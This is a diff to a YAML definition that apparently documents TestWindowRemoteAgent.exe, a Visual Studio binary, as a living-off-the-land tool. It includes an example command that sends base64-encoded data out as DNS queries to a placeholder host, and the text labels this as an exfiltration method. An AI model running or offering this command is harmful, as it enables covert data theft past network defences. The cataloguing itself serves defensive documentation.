@@ -2,7 +2,8 @@
 id: windows-upload-testwindowremoteagent
 namespace: windows:upload:testwindowremoteagent
 name: testwindowremoteagent
-description: 'TestWindowRemoteAgent.exe is the command-line tool to establish RPC Located at: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe.'
+description: 'TestWindowRemoteAgent.exe is the command-line tool to establish RPC
+  Located at: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe.'
 author: Onat Uzunyayla
 version: 1.0.0
 capabilities:
@@ -41,7 +42,12 @@ resource_profile:
 allowed-tools:
 - testwindowremoteagent
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdout
+- remote
 execution:
   template: testwindowremoteagent
   sandbox: execFile
@@ -49,7 +55,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Sends DNS query for open connection to any host, enabling exfiltration over DNS (Attackers may utilize this to exfiltrate data over DNS)
+- description: Sends DNS query for open connection to any host, enabling exfiltration
+    over DNS (Attackers may utilize this to exfiltrate data over DNS)
   command: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
 references: []
 techniques:
@@ -65,7 +72,6 @@ install:
   commands:
   - choco install testwindowremoteagent
 ---
-
 
 # testwindowremoteagent
 
